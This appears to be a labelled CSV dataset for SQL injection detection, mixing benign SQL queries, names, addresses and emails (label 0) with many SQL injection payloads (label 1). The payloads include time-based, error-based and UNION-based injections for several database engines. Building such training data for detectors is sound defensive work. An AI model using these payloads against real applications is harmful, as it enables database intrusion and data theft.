Query,Label
1'   )    )    as txxn whERE 7884  =  7884 aND 3715 iN    (    (   CHaR  (  113  )  +CHaR  (  113  )  +CHaR  (  112  )  +CHaR  (  106  )  +CHaR  (  113  )  +  (  seLECt   (  cASE WhEn   (  3715  =  3715  )   tHeN CHaR  (  49  )   elsE CHaR  (  48  )   eNd   )    )   +CHaR  (  113  )  +CHaR  (  122  )  +CHaR  (  118  )  +CHaR  (  122  )  +CHaR  (  113   )    )     )  --,1
SELECT COUNT ( rope ) FROM exercise,0
"calle sant joan, 123,",0
calle codigo correspondencia oficial correos-telegrafos 33,0
"1   )    )    aNd 3202  =  liKe  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    aNd    (    (   2939  =  2939",1
SELECT * FROM earn,0
"1%""   )    )     )   and sleep  (  5  )  #",1
"SELECT powder,new,best,such,live     (  (  wrapped JOIN being ON only.tiny =  copy.noise )   INNER JOIN shownON Orders.perfectly =  satisfied.streetID )",0
8.2197E+15,0
"-9152""   )    )    As avga WhERe 3825  =  3825 oRdeR By 1#",1
11106027v,0
"-3362' WhErE 6567  =  6567 OR 1 GroUp by concat  (  0x7171706a71,  (  SElecT   (  CasE wHeN   (  4232  =  4232  )   tHeN 1 ELSE 0 END   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    hAvINg min  (  0  )  #",1
dra2atizar,0
"1' aNd make_set  (  8403  =  8403,8899  )   aNd 'fttd' LikE 'fttd",1
h?ele77,0
"INSERT INTO automobile ( cry, strange, cost, though, wise, original )  VALUES  ( 'nobody', 'price'. zero', 'table', 'fully', 'tool', 'loose' )",0
"SELECT * FROM eat ORDER BY copper, dot",0
"-6520%""  )   ORder by 1#",1
2614,0
SELECT * FROM new WHERE cloth = 'daughter'  AND City = 'given',0
SELECT * FROM simplest WHERE warm BETWEEN call09/01/1996ever AND everyone15/31/1996loud,0
"SELECT * FROM right WHERE meant BETWEEN ""cotton"" AND    ""sort""",0
donadieu zanotti,0
"1'   )    )    AnD exp  (  ~  (  seleCt * FrOm   (  seleCt concat  (  0x7171706a71,  (  seleCt   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    AnD    (    (   'kqqf'  =  'kqqf",1
SELECT TOP 3 * FROM load WHERE several = 'film',0
SELECT * FROM receive WHERE Price NOT BETWEEN 10 AND 20,0
SELECT * FROM local ORDER BY pet,0
-4617'   )    )     )   OR 9323  =  9323#,1
DELETE FROM union WHERE drew = 'gravity',0
SELECT DISTINCT corner FROM shore,0
"-8409%'  )   OR make_set  (  9354  =  9354,7185  )   aND   (  '%'  =  '",1
"SELECT * FROM putting ORDER BY thought, nice",0
selles tanari,0
-7164%' oR 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selEct   (  cAsE wheN   (  4747  =  4747  )   theN 1 ELsE 0 enD  )   FRoM dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   ANd '%'  =  ',1
SELECT * FROM mixture WHERE guard BETWEEN '1996-07-01' AND '1996-07-31',0
62258107m,0
1   )    )     ),1
-5967 oR 3440  =  CAst   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  SElEcT   (  CASe whEN   (  3440  =  3440  )   thEN 1 ElSe 0 End   )    )   ::TeXT||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # lhoh,1
bakkum,0
"-3952'  )   UnIon alL selEcT 6644,6644,6644--",1
SELECT * FROM  ( SELECT seen FROM see ),0
"-6928""   )    )    oR 3440  =  CasT   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  SEleCt   (  CAse wHen   (  3440  =  3440  )   thEN 1 elsE 0 ENd   )    )   ::TeXT||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   anD    (    (   ""mxhr"" LIKe ""mxhr",1
1'+  (  seLEct tdkt wHerE 4535  =  4535,1
"1'  )   And 5556  =    (  selEct count  (  *  )   FroM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )",1
moriego,0
"-4127%' UnioN ALl SelEcT 9558,9558,9558#",1
50159319e,0
"-4797' unIOn aLl seLeCt 8223,8223,8223,8223,8223,8223,8223,8223#",1
"-3209'+  (  SelECT ldum WheRe 9912  =  9912 uNIOn All SelECT 9912,9912,9912,9912#",1
SELECT * FROM  ( SELECT development FROM traffic ),0
SELECT * FROM read WHERE slightly = 'remember' FETCH FIRST 3 ROWS ONLY,0
yamile de francisco,0
"-3361 where 1335  =  1335 oR elt  (  5891  =  5092,5092  )  --",1
"cuesta de la baronesa, 192",0
cabot camaran,0
houstin@maxitienda.zr,0
1'||  (  SELEcT 'bhxx' WhEre 2585  =  2585,1
SELECT TOP 3 * FROM certainly,0
"1' wHEre 1031  =  1031 OR chAR  (  68  )  ||chAR  (  69  )  ||chAR  (  97  )  ||chAR  (  85  )    =  regexp_substring  (  repeat  (  rIgHt  (  chAR  (  5389  )  ,0  )  ,5000000000  )  ,nULL  )  --",1
"waitfor delay '0:0:5' aND ""%""  =  """,1
"1""  )   WhEre 5814  =  5814 and 6969  =    (  SELEct 6969 fRoM pg_sleep  (  5   )    )   --",1
SELECT COUNT ( author ) FROM bear,0
dehr,0
"1' In boolean mode  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  selEcT   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   #",1
1'   )    )    AS lkse WHEre 9951  =  9951,1
"1""   )    )    AS wfne WHERE 8933  =  8933",1
"1',iif  (  7475  =  7475,1,1/0  )",1
1%'   )    )     )   aND 3916  =  6327--,1
7106,0
2308,0
SELECT AVG ( car )  FROM tea  SELECT SUM ( this ),0
4ino57l,0
1s,1
"c/ leopoldo alas ""clarin"" 4, 6?b",0
1o92r,0
"SELECT BINARY ""HELLO""  =  ""hello"";",0
"SELECT * FROM finish ORDER BY cow, sound",0
yarela,0
"SELECT COUNT ( cup ) , ate FROM number BY sugar",0
SELECT * FROM herself WHERE    NOT gas = 'loud',0
SELECT * FROM function  WHERE object = end,0
"1'  )   AnD 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   AnD   (  'rgue' liKE 'rgue",1
"manzano, el",0
"-7514%""   )    )     )   or 2448  =  8797#",1
"-2384%'   )    )    uniON all seLECT 2467,2467,2467,2467#",1
"1""  )   WhErE 5794  =  5794 UNIoN all SELeCT nuLL,nuLL,nuLL,nuLL,nuLL,nuLL,nuLL,nuLL,nuLL,nuLL#",1
UPDATE noun SET else = 'negative'WHERE late = 'audience',0
1'   )    )    aND 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seLeCt   (  case When   (  4386  =  4386  )   ThEn 1 eLSe 0 ENd  )   froM dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    aND    (    (   'foop' liKE 'foop,1
SELECT MIN ( twelve )  AS printed FROM automobile,0
"1'   )    )     )   oR chAR  (  117  )  ||chAR  (  111  )  ||chAR  (  105  )  ||chAR  (  100  )    =  regexp_substring  (  repeat  (  LefT  (  crypt_key  (  chAR  (  65  )  ||chAR  (  69  )  ||chAR  (  83  )  ,nuLl  )  ,0  )  ,500000000  )  ,nuLl  )   ANd    (    (     (  'akyc'  =  'akyc",1
"SELECT * FROM sets ORDER BY torn ASC, cat DESC",0
SELECT TOP 50 PERCENT * FROM walk SELECT * FROM shelf FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM proud,0
SELECT bare FROM spell,0
"1  )   As lhie WhEre 4631  =  4631 UNIon ALl SElEct nuLL,nuLL,nuLL,nuLL,nuLL--",1
"SELECT wp_posts.* FROM wp_posts LEFT JOIN wp_postmeta ON  (  wp_posts.ID  =  wp_postmeta.post_id AND wp_postmeta.meta_key  =  'fave_agent_visible'  )  LEFT JOIN wp_postmeta AS mt1 ON  (  wp_posts.ID  =  mt1.post_id  )  WHERE 1 = 1 AND wp_posts.ID NOT IN  ( 28313,28341 )  AND  (  wp_postmeta.post_id IS NULL OR  (  mt1.meta_key  =  'fave_agent_visible' AND CAST ( mt1.meta_value AS SIGNED )  ! =  '1'  )   )  AND wp_posts.post_type  =  'houzez_agent' AND   (  (  wp_posts.post_status  =  'publish'  )  )   GROUP BY wp_posts.ID ORDER BY wp_posts.post_title ASC",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 262327 )  ORDER BY meta_id ASC",0
SELECT * FROM something ORDER BY earth,0
SELECT * FROM map  WHERE depth = leather,0
sEleCT * FrOm users WHErE id  =  1 +$+. or 1  =  1 -- 1,1
SElECt caSe whEn 3920  =  4402 ThEn 1 ElsE NUlL eNd--,1
"1""  )   anD Char  (  120  )  ||Char  (  106  )  ||Char  (  117  )  ||Char  (  85  )    =  regexp_substring  (  repeat  (  RiGhT  (  Char  (  9981  )  ,0  )  ,5000000000  )  ,NUll  )   anD   (  ""lsca"" lIkE ""lsca",1
SELECT * FROM grown WHERE automobile = 'milk'  OR control = 'wild',0
"-3433'  )   whERe 8307  =  8307 uNION aLL SelecT 8307,8307,8307,8307,8307,8307,8307,8307--",1
roca,0
SELECT * FROM letter WHERE too BETWEEN 'slabs' AND 'ten',0
"1' whERe 7353  =  7353 Or 8156  =    (  SeLECt count  (  *  )   FROm generate_series  (  1,5000000   )    )   --",1
"SELECT pretty, friend, successFROM wait WHERE independent  IS NOT NULL",0
15873,0
"-1748%""   )    )     )   uNiON ALL seLect 2987#",1
"INSERT INTO apple ( difference, bat, jungle, including, circle, today )  VALUES  ( 'title', 'repeat'. end', 'let', 'floating', 'explore', 'tax' )",0
46562846j,0
"1' AnD 6510  =    (  sELECT count  (  *  )   FROm sysusers As sys1,sysusers As sys2,sysusers As sys3,sysusers As sys4,sysusers As sys5,sysusers As sys6,sysusers As sys7  )   AnD 'eqle'  =  'eqle",1
"1%""   )    )     )   AND exp  (  ~  (  SELECt * fROm   (  SELECt concat  (  0x7171706a71,  (  SELECt   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    AND    (    (     (  ""%""  =  """,1
seLECt   (  CAse whEn   (  1946  =  1302  )   tHEn 1946 ELSe 1/  (  seLECt 0  )   eNd  )  --,1
SELECT TOP 3 * FROM gray WHERE tropical = 'son',0
"seLeCT * FROM users wherE id  =  1 Or \.<$ UnION seLeCT 1,@@VERSIOn -- 1",1
SELECT knowledge ( s )  FROM longer SELECT create ( s ),0
mandruso,0
Ã¢ÂÂ Or 3  =  3 --,1
1  )   WHERE 6035  =  6035,1
16340,0
"1'  )   as idqc whERE 5288  =  5288 ANd elt  (  1210  =  1210,SLEEp  (  5   )    )   --",1
syamala,0
SELECT AVG ( instance ) FROM spite,0
SELECT TOP 3 * FROM keep SELECT * FROM nearby 3SELECT * FROM improve,0
1'  )   waitfor delay '0:0:5' anD   (  'peyv' liKe 'peyv,1
1 rlike   (  sElEcT   (  CaSE WheN   (  8911  =  5301  )   thEn 1 elSe 0x28 eNd   )    )   # pmuh,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 30696 )  ORDER BY meta_id ASC",0
SELECT COUNT ( DISTINCT no )  FROM there,0
"1' Or 9643  =    (  SEleCT count  (  *  )   FrOm domain.domains AS t1,domain.columns AS t2,domain.tables AS t3  )   aNd 'bwrb' LiKE 'bwrb",1
"SELECT * FROM spite WHERE strong IN  ( 'blood', 'ancient', 'slight' )",0
SELECT * FROM popular WHERE broke = 'thou' FETCH FIRST 3 ROWS ONLY,0
SELECT TOP 50 PERCENT * FROM officer SELECT * FROM single FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM move,0
SELECT dirty ( s )  FROM search SELECT who FROM think,0
niembro urkiaga,0
"-1051""  )   WhERe 6586  =  6586 OR 6647  =  6738#",1
SELECT * FROM belong WHERE tight = 'bow' FETCH FIRST 3 ROWS ONLY,0
\'; desc users; --,1
quint,0
SELECT MIN ( spell )  AS paid FROM essential,0
"-2414%""  )   or elt  (  1032  =  1032,3623  )   And   (  ""%""  =  """,1
DELETE FROM room,0
f3ac76025,0
"1  )   WherE 7978  =  7978 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"SELECT three AS halfway, pipe AS [burn]  FROM fallen",0
tiramollar,0
"-1908""   )    )    Union All sELeCt 4072,4072,4072,4072,4072,4072,4072,4072,4072,4072#",1
"-3441'   )    )    aS dxvt WHerE 9291  =  9291 UnION aLL seLECt 9291,9291,9291#",1
"-6659'  )   wherE 1256  =  1256 UniOn AlL sELeCt 1256,1256--",1
1%',1
SELECT COUNT ( apart ) FROM pole,0
SelecT * FROm users WHeRE id  =  1 + \+%\ or 1  =  1 -- 1,1
36930027p,0
sant llus,0
areces casallac,0
(  sElEct * fRoM   (  sElEct  (  slEeP  (  5   )    )     )  srmq  )   And   (  'kerg' lIke 'kerg,1
SELECT * FROM wing WHERE captain = 'man' LIMIT 3,0
ge2613an0,0
SELECT * FROM football,0
"SELECT clearly, popular, stoveFROM clear WHERE excited  IS NOT NULL",0
"1"" WhERe 4319  =  4319",1
2252,0
SELECT COUNT ( facing )  FROM gray,0
"-2027%""  )   UNIOn ALl selecT 2048,2048,2048,2048,2048,2048,2048,2048#",1
%2A%28%7C%28objectclass%3D%2A%29%29,1
SELECT * FROM building WHERE shallow = 'aloud' FETCH FIRST 3 ROWS ONLY,0
229i9967te,0
SELECT * FROM think WHERE consist = 'face',0
"seLEcT * frOm users wHere id  =  1 uNion seLEcT +!<@,VERSiOn  (    )   -- 1",1
SELECT * FROM wp_posts WHERE ID  =  262331 LIMIT 1,0
"SELECT past,shallow,giving,shot,entirely     (  (  control JOIN arrange ON been.main =  short.courage )   INNER JOIN stageON Orders.ought =  bottom.dozenID )",0
"-2448%""  )   oR 3038  =  3038",1
"SELECT * FROM consonant WHERE follow IN  ( 'opinion', 'copy', 'lunch' )",0
for26same8te,0
"1'  )   As yhgk whErE 9246  =  9246 and ChAr  (  120  )  ||ChAr  (  106  )  ||ChAr  (  117  )  ||ChAr  (  85  )    =  regexp_substring  (  repeat  (  riGHT  (  ChAr  (  9981  )  ,0  )  ,5000000000  )  ,nuLl  )  --",1
SELECT TOP 3 * FROM split SELECT * FROM explore 3SELECT * FROM tie,0
"-6084'   )    )    Or 1570  =  converT  (  int,  (  selecT CHAr  (  113  )  +CHAr  (  113  )  +CHAr  (  112  )  +CHAr  (  106  )  +CHAr  (  113  )  +  (  selecT   (  CaSE WhEN   (  1570  =  1570  )   THeN CHAr  (  49  )   elsE CHAr  (  48  )   eNd   )    )   +CHAr  (  113  )  +CHAr  (  122  )  +CHAr  (  118  )  +CHAr  (  122  )  +CHAr  (  113   )    )     )   And    (    (   'dfcp'  =  'dfcp",1
"1"" aNd   (  3020  =  3020  )  *6703 aNd ""tnzp"" likE ""tnzp",1
bellaguarda,0
1'||  (  seLect 'rdqv' FRoM dual WHere 1894  =  1894,1
1'+  (  SELeCT hkrg WheRE 3665  =  3665,1
SELECT * FROM treated WHERE motor = 'slight'  AND  ( accept = 'sink' OR read = 'leave' ),0
coe,0
"INSERT INTO help ( grandfather, lungs, trail, time, closer, tongue )  VALUES  ( 'mistake', 'means'. surprise', 'outer', 'porch', 'beside', 'captain' )",0
wailing@mariposasentudia.je,0
"SELECT * FROM fallen WHERE whistle IN  ( 'strip', 'herself', 'direction' )",0
"1""  )   whEre 8407  =  8407 and 9254  =    (  SELEct count  (  *  )   FRom rdb$fields As t1,rdb$types As t2,rdb$collations As t3,rdb$functions As t4  )  --",1
SELECT purple FROM grabbed UNION SELECT tea FROM careful ORDER BY character,0
1'  )   uNIOn ALl SELect nUll--,1
"1'||  (  sELEct 'cozi' FroM dual wHErE 2607  =  2607 AnD 9660  =    (  sELEct count  (  *  )   FroM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"SELECT Employees.solution, COUNT ( Orders.braveID )  AS fromFROM    ( OrdersINNER JOIN limited ON Orders.hisID  =  Employees.boundID )",0
SELECT * FROM driver,0
SELECT COUNT ( essential ) FROM jack,0
SELECT angle ( s )  FROM identity FULL OUTER JOIN,0
"UPDATE pattern SET somehow =  'take', City =  'unhappy' WHERE avoid =  grass",0
SELECT * FROM lamp,0
gaetano,0
"SELECT customername, contactname FROM customers; ALTER TABLE Customers ADD Email varchar ( 255 ) ; ALTER TABLE Customers DROP COLUMN Email; DROP TABLE Shippers;  TRUNCATE TABLE Categories;",0
"1""  )   or 5356  =    (  sElECT count  (  *  )   FRom sysusers As sys1,sysusers As sys2,sysusers As sys3,sysusers As sys4,sysusers As sys5,sysusers As sys6,sysusers As sys7  )  --",1
"1"" aND 3824  =  BenchmArk  (  5000000,md5  (  0x76555642   )    )",1
"1  )   aS zelk WHeRe 1944  =  1944 Or ChaR  (  117  )  ||ChaR  (  111  )  ||ChaR  (  105  )  ||ChaR  (  100  )    =  regexp_substring  (  repeat  (  LEFT  (  crypt_key  (  ChaR  (  65  )  ||ChaR  (  69  )  ||ChaR  (  83  )  ,nulL  )  ,0  )  ,500000000  )  ,nulL  )  --",1
-5830'  )   as fivy WHeRe 2173  =  2173 Or 5903  =    (  'qqpjq'||  (  selECt cAse 5903 WhEn 5903 THEN 1 eLSE 0 ENd FrOM rdb$DAtAbaSe  )  ||'qzvzq'  )  --,1
pawley@santacruzdelvoto.vu,0
"SELECT strawID AS ID, arrive AS if FROM alphabet",0
"1""   )    )     )   aND 7533  =  7533 aND    (    (     (  ""alvd"" Like ""alvd",1
olivares,0
522lta,0
SELECT MIN ( smell )  AS party FROM medicine,0
"UPDATE partly SET safety =  'shape', City =  'raise' WHERE throughout =  same",0
"1  )   As ocut wHERe 6800  =  6800 anD elt  (  4249  =  4249,7259  )  --",1
SELECT COUNT ( plates ) FROM needed,0
1%' ANd 4595  =  4595#,1
"1""   )    )    AND elt  (  1210  =  1210,sLeEp  (  5   )    )    AND    (    (   ""utlk"" LIKe ""utlk",1
trish,0
21710,0
vries,0
gwenda,0
"sELect SleeP  (  5  )   anD    (    (     (  ""zlal""  =  ""zlal",1
"SELECT noiseID AS ID, paint AS exactly FROM parts",0
"1' WHerE 6721  =  6721 uNioN aLL SeLecT nUll,nUll,nUll,nUll,nUll,nUll,nUll,nUll,nUll,nUll#",1
"SELECT cap, meal, hungry FROM captured WHERE pony  IS NULL",0
stavro,0
"iif  (  1217  =  8831,1,1/0  )",1
"SELECT * FROM above WHERE lips IN  ( 'adult', 'decide', 'our' )",0
SELECT * FROM affect,0
7s0av07rido,0
SELECT EXP ( 2 ) ;,0
r4a8e3a,0
"SELECT wood, hardly+ ', ' + mental+ ' ' + poor+ ', ' + getting AS diagram  FROM vast",0
"-6431""   )    )    uNioN aLL seLect 2358,2358,2358,2358,2358,2358,2358,2358,2358,2358#",1
SELECT * FROM mouse 3 SELECT * FROM force,0
"-9859""   )    )     )   uNiON alL selECT 6595,6595,6595,6595,6595,6595,6595#",1
SELECT shelf ( s )  FROM none UNION ALL,0
"calle juana ibarborou 134,",0
SelECt slEep  (  5  )   And   (  4863  =  4863,1
"1"" oR 4411  =    (  SELECT count  (  *  )   frOm sysusers aS sys1,sysusers aS sys2,sysusers aS sys3,sysusers aS sys4,sysusers aS sys5,sysusers aS sys6,sysusers aS sys7  )",1
SELECT * FROM substance FETCH FIRST 50 PERCENT ROWS ONLY,0
28413,0
sELECT   (  CaSe WHen   (  4059  =  7807  )   THEn 4059 eLsE 1/  (  sELECT 0  )   end  )  --,1
"1%'   )    )     )   aNd 4241  =  cONvERt  (  int,  (  SEleCT cHAr  (  113  )  +cHAr  (  113  )  +cHAr  (  112  )  +cHAr  (  106  )  +cHAr  (  113  )  +  (  SEleCT   (  casE WhEN   (  4241  =  4241  )   THeN cHAr  (  49  )   elsE cHAr  (  48  )   END   )    )   +cHAr  (  113  )  +cHAr  (  122  )  +cHAr  (  118  )  +cHAr  (  122  )  +cHAr  (  113   )    )     )   aNd    (    (     (  '%'  =  '",1
SELECT AVG ( milk ) FROM than,0
1'  )   WheRE 7629  =  7629 rlike   (  sElEcT * FroM   (  sElEcT  (  SleeP  (  5   )    )     )  vwyq  )  #,1
1  )   as wshv wherE 5684  =  5684,1
methi,0
SELECT * FROM else FETCH FIRST 50 PERCENT ROWS ONLY,0
"1""  )   as dien WhERe 4022  =  4022",1
praxila,0
SELECT * FROM long WHERE examine = 'log',0
1   )    )    AS wrhe WheRe 6120  =  6120 And 6240  =    (  'qqpjq'||  (  seleCT CaSE 6240 wHen 6240 thEN 1 Else 0 END fROm rdb$DaTAbAsE  )  ||'qzvzq'  )  --,1
8230,0
"SElECT * FROm users wHeRE id  =  1 Or "";{"" Or 1  =  1 -- 1",1
"1""   )    )     )    (  SeLEcT   (  cAsE whEn   (  5451  =  5451  )   then regexp_substring  (  repeat  (  rIGHT  (  ChAR  (  5451  )  ,0  )  ,500000000  )  ,nUll  )   ELSe ChAR  (  108  )  ||ChAR  (  76  )  ||ChAR  (  112  )  ||ChAR  (  116  )   ENd  )   from information_schema.system_users  )   and    (    (     (  ""znzb"" lIKE ""znzb",1
-9148  )   whErE 2027  =  2027 OR 8571  =  8571--,1
pobladura de pelayo garca,0
"SELECT column_name ( s )  FROM natural,brother",0
"SELECT windowID AS ID, plus AS passage FROM frozen",0
jarad,0
"1%'   )    )     )   or 5286  =    (  sElECt count  (  *  )   fRoM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   aNd    (    (     (  '%'  =  '",1
"SeleCt * froM users wheRe id  =  '1' unION SeleCt ""[""_,VERsiOn  (    )   -- 1'",1
"1%'  )   OR 7417  =    (  SeLEct count  (  *  )   FRoM sysibm.systables aS t1,sysibm.systables aS t2,sysibm.systables aS t3  )  --",1
SELECT TOP 3 * FROM wave SELECT * FROM tribe 3SELECT * FROM football,0
1'   )    )     )   ANd 2853  =  CASt   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  selEcT   (  caSE whEN   (  2853  =  2853  )   then 1 ElsE 0 EnD   )    )   ::tEXt||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    As numeric  )   ANd    (    (     (  'gegg'  =  'gegg,1
357,0
"1   )    )     )   UNiON ALl SelEcT NUlL,NUlL,NUlL,NUlL,NUlL,NUlL,NUlL,NUlL--",1
SELECT ill ( s )  FROM cost SELECT leader ( s ),0
SELECT * FROM  ( SELECT minute FROM excitement ),0
SELECT brave FROM tongue UNION ALL SELECT ought FROM business ORDER BY specific,0
"1%"" or   (  SeLEct 9173 fROM  (  SeLEct count  (  *  )  ,concat  (  0x7171706a71,  (  SeLEct   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x fROM information_schema.character_sets gROuP by x  )  a  )   aND ""%""  =  """,1
SELECT * FROM arm WHERE tongue = 'divide' FETCH FIRST 3 ROWS ONLY,0
"1  )   aNd 3707  =    (  sELeCT count  (  *  )   frOm sysibm.systables As t1,sysibm.systables As t2,sysibm.systables As t3  )   aNd   (  9509  =  9509",1
8.00405E+14,0
"SELECT * FROM call WHERE flight IN  ( 'become', 'who', 'basket' )",0
basta@24htranslations.edu,0
"-4849""   )    )    Or   (  5005  =  9111  )  *9111 And    (    (   ""catv"" like ""catv",1
"sol, 153",0
tromba,0
SELECT * FROM potatoes WHERE older BETWEEN '1996-07-01' AND '1996-07-31',0
"1  )   wHere 9432  =  9432 aNd 6510  =    (  sELEct count  (  *  )   FrOM sysusers As sys1,sysusers As sys2,sysusers As sys3,sysusers As sys4,sysusers As sys5,sysusers As sys6,sysusers As sys7  )  --",1
SELECT COUNT ( chamber ) FROM managed,0
pelayos,0
"1%""   )    )     )   And 2716  =    (  seLEct count  (  *  )   from sysusers As sys1,sysusers As sys2,sysusers As sys3,sysusers As sys4,sysusers As sys5,sysusers As sys6,sysusers As sys7  )  --",1
SELECT * FROM center WHERE inch BETWEEN contrast09/01/1996your AND send15/31/1996week,0
"1'   )    )    Or   (  sELeCt 9173 fRom  (  sELeCt count  (  *  )  ,concat  (  0x7171706a71,  (  sELeCt   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x fRom information_schema.character_sets GROup bY x  )  a  )   and    (    (   'pqxe' LIkE 'pqxe",1
1.21588E+15,0
"1'   )    )     )   aND cHAR  (  111  )  ||cHAR  (  77  )  ||cHAR  (  121  )  ||cHAR  (  88  )    =  regexp_substring  (  repeat  (  lEft  (  crypt_key  (  cHAR  (  65  )  ||cHAR  (  69  )  ||cHAR  (  83  )  ,nuLL  )  ,0  )  ,500000000  )  ,nuLL  )   aND    (    (     (  'xzcr'  =  'xzcr",1
